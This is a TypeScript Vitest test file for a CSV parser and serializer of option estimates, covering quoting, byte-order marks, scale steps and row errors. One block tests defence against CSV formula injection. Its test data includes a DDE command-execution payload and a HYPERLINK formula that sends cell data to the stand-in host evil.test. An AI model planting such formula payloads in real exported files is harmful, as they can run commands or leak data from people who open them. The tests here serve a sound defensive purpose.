import { describe, expect, it } from "vitest";

import { addresses } from "@/testing/fixtures";
import type { OptionScale } from "@/types/optionScale";

import { parseEstimateCsv, serializeEstimateCsv } from "../estimateCsv";

const [FIRST, SECOND] = addresses.childMarkets;

const villeneuve: OptionScale = {
  market: FIRST,
  name: "Villeneuve",
  color: "#009aff",
  unit: "$M",
  lowerBound: 0,
  upperBound: 500,
};
const gerwig: OptionScale = {
  market: SECOND,
  name: "Gerwig, Greta",
  color: "#ff0000",
  unit: "$M",
  lowerBound: 0,
  upperBound: 500,
};
const scales = [villeneuve, gerwig];

describe("parseEstimateCsv rows", () => {
  it("splits rows on either line ending", () => {
    expect(parseEstimateCsv('name,estimate\r\nVilleneuve,250\n"Gerwig, Greta",300', scales)).toEqual([
      { scale: villeneuve, value: 250 },
      { scale: gerwig, value: 300 },
    ]);
  });

  it("keeps commas and doubled quotes inside a quoted field", () => {
    const quoted = { ...gerwig, name: 'Gerwig, "Greta"' };

    expect(parseEstimateCsv('name,estimate\n"Gerwig, ""Greta""",300', [villeneuve, quoted])).toEqual([
      { scale: quoted, value: 300 },
    ]);
  });

  it("skips blank lines", () => {
    expect(parseEstimateCsv("name,estimate\n\n  ,\nVilleneuve,250\n", scales)).toEqual([
      { scale: villeneuve, value: 250 },
    ]);
  });
});

describe("serializeEstimateCsv", () => {
  it("starts with a UTF-8 byte-order mark, which Excel needs to read the file as UTF-8", async () => {
    const csv = serializeEstimateCsv([{ name: "São Paulo", estimate: 250 }]);
    const bytes = new Uint8Array(await new Blob([csv]).arrayBuffer());

    expect([...bytes.slice(0, 3)]).toEqual([0xef, 0xbb, 0xbf]);
    expect(parseEstimateCsv(await new Blob([csv]).text(), [{ ...villeneuve, name: "São Paulo" }])).toHaveLength(1);
    expect(parseEstimateCsv(csv, [{ ...villeneuve, name: "São Paulo" }])).toHaveLength(1);
  });

  it("writes the header and quotes a name that carries a comma", () => {
    const csv = serializeEstimateCsv([
      { name: "Villeneuve", estimate: 250 },
      { name: "Gerwig, Greta", estimate: 300.5 },
    ]);

    expect(csv).toBe('\uFEFFname,estimate\nVilleneuve,250\n"Gerwig, Greta",300.5');
  });

  it("round-trips through the parser", () => {
    const csv = serializeEstimateCsv([
      { name: "Villeneuve", estimate: 250 },
      { name: "Gerwig, Greta", estimate: 300 },
    ]);

    expect(parseEstimateCsv(csv, scales)).toEqual([
      { scale: villeneuve, value: 250 },
      { scale: gerwig, value: 300 },
    ]);
  });
});

describe("parseEstimateCsv", () => {
  it("matches names without regard to case or surrounding spaces", () => {
    expect(parseEstimateCsv("name,estimate\n  villeneuve ,250", scales)).toEqual([{ scale: villeneuve, value: 250 }]);
  });

  it("accepts the columns in either order", () => {
    expect(parseEstimateCsv("estimate,name\n250,Villeneuve", scales)).toEqual([{ scale: villeneuve, value: 250 }]);
  });

  it("keeps the last row when an option appears twice", () => {
    expect(parseEstimateCsv("name,estimate\nVilleneuve,250\nVilleneuve,260", scales)).toEqual([
      { scale: villeneuve, value: 260 },
    ]);
  });

  it("refuses a header without both columns", () => {
    expect(() => parseEstimateCsv("option,score\nVilleneuve,250", scales)).toThrow(
      "The first row must be: name,estimate",
    );
  });

  it("refuses a header with a third column", () => {
    expect(() => parseEstimateCsv("name,estimate,note\nVilleneuve,250,x", scales)).toThrow(
      "The first row must be: name,estimate",
    );
  });

  it("refuses an estimate finer than the scale's step rather than rounding it", () => {
    expect(() => parseEstimateCsv("name,estimate\nVilleneuve,312.37", scales)).toThrow(
      "Row 2: Villeneuve moves in steps of 1, so 312.37 is not allowed.",
    );
  });

  it("reads a scale in the tens of thousands, whose step is a hundred", () => {
    const wide: OptionScale = { ...villeneuve, lowerBound: 0, upperBound: 10_000 };

    expect(parseEstimateCsv("name,estimate\nVilleneuve,4300", [wide])).toEqual([{ scale: wide, value: 4300 }]);
    expect(() => parseEstimateCsv("name,estimate\nVilleneuve,4321", [wide])).toThrow("steps of 100");
    // a thousands separator survives only inside quotes, and is then not a number
    expect(() => parseEstimateCsv('name,estimate\nVilleneuve,"4,300"', [wide])).toThrow('"4,300" is not a number');
  });

  it("refuses a file with only a header", () => {
    expect(() => parseEstimateCsv("name,estimate\n", scales)).toThrow("No rows under the header.");
  });

  it("names the row that has no option by that name", () => {
    expect(() => parseEstimateCsv("name,estimate\nVilleneuve,250\nNolan,250", scales)).toThrow(
      'Row 3: there is no option named "Nolan"',
    );
  });

  it("names the row whose estimate is not a number", () => {
    expect(() => parseEstimateCsv("name,estimate\nVilleneuve,lots", scales)).toThrow('Row 2: "lots" is not a number');
  });

  it("names the row whose estimate is off the option's scale", () => {
    expect(() => parseEstimateCsv("name,estimate\nVilleneuve,501", scales)).toThrow(
      "Row 2: Villeneuve takes 0 to 500, not 501",
    );
  });

  it("reads an empty estimate as no estimate for that option", () => {
    expect(parseEstimateCsv('name,estimate\nVilleneuve,\n"Gerwig, Greta",300', scales)).toEqual([
      { scale: villeneuve, value: null },
      { scale: gerwig, value: 300 },
    ]);
  });

  it("names the row missing a name", () => {
    expect(() => parseEstimateCsv("name,estimate\n,250", scales)).toThrow("Row 2: the name is missing.");
  });

  it.each([
    ["cut off after a name", 'name,estimate\nGerwig,300\n"Villeneuve'],
    ["with no estimate cell", "name,estimate\nVilleneuve"],
    ["with a third cell", "name,estimate\nVilleneuve,250,1"],
  ])("refuses a row %s, rather than read it as no estimate", (_, csv) => {
    const named = [{ ...gerwig, name: "Gerwig" }, villeneuve];

    expect(() => parseEstimateCsv(csv, named)).toThrow(/^Row \d+: both columns need a value\.$/);
  });
});

describe("serializeEstimateCsv with a name a spreadsheet would run as a formula", () => {
  const hostile = [
    "=1+1",
    "+cmd|' /C calc'!A0",
    "-2+3",
    "@SUM(1,2)",
    "\t=2+2",
    "\r=3+3",
    '=HYPERLINK("https://evil.test/?"&A1,"Open")',
  ];
  const scaleNamed = (name: string, index: number): OptionScale => ({
    ...villeneuve,
    market: `0x${(index + 1).toString(16).padStart(40, "0")}`,
    name,
  });

  it.each(hostile)("writes %j behind an apostrophe, so the cell reads as text", (name) => {
    const [, row] = serializeEstimateCsv([{ name, estimate: 50 }]).split("\n");
    const cell = row!.startsWith('"') ? row!.slice(1) : row!;

    expect(cell.startsWith(`'${name[0]}`)).toBe(true);
  });

  it("reads every such name back as its own option", () => {
    const named = hostile.map(scaleNamed);
    const csv = serializeEstimateCsv(named.map((scale) => ({ name: scale.name, estimate: 50 })));

    expect(parseEstimateCsv(csv, named).map(({ scale }) => scale)).toEqual(named);
  });

  it("writes a name that already starts with an apostrophe behind another, so it reads back as itself", () => {
    const quoted = scaleNamed("'=1+1", 0);
    const csv = serializeEstimateCsv([{ name: quoted.name, estimate: 50 }]);

    expect(csv.split("\n")[1]).toBe("''=1+1,50");
    expect(parseEstimateCsv(csv, [quoted, scaleNamed("=1+1", 1)])).toEqual([{ scale: quoted, value: 50 }]);
  });

  it("round-trips two options whose names differ only by a leading apostrophe", () => {
    const named = [scaleNamed("=1+1", 0), scaleNamed("'=1+1", 1)];
    const csv = serializeEstimateCsv([
      { name: named[0]!.name, estimate: 10 },
      { name: named[1]!.name, estimate: 20 },
    ]);

    expect(parseEstimateCsv(csv, named)).toEqual([
      { scale: named[0], value: 10 },
      { scale: named[1], value: 20 },
    ]);
  });

  it("writes an option with no estimate as an empty cell", () => {
    expect(serializeEstimateCsv([{ name: "Villeneuve", estimate: null }]).split("\n")[1]).toBe("Villeneuve,");
  });

  it("writes a negative estimate as a number", () => {
    expect(serializeEstimateCsv([{ name: "Villeneuve", estimate: -5 }]).split("\n")[1]).toBe("Villeneuve,-5");
  });
});
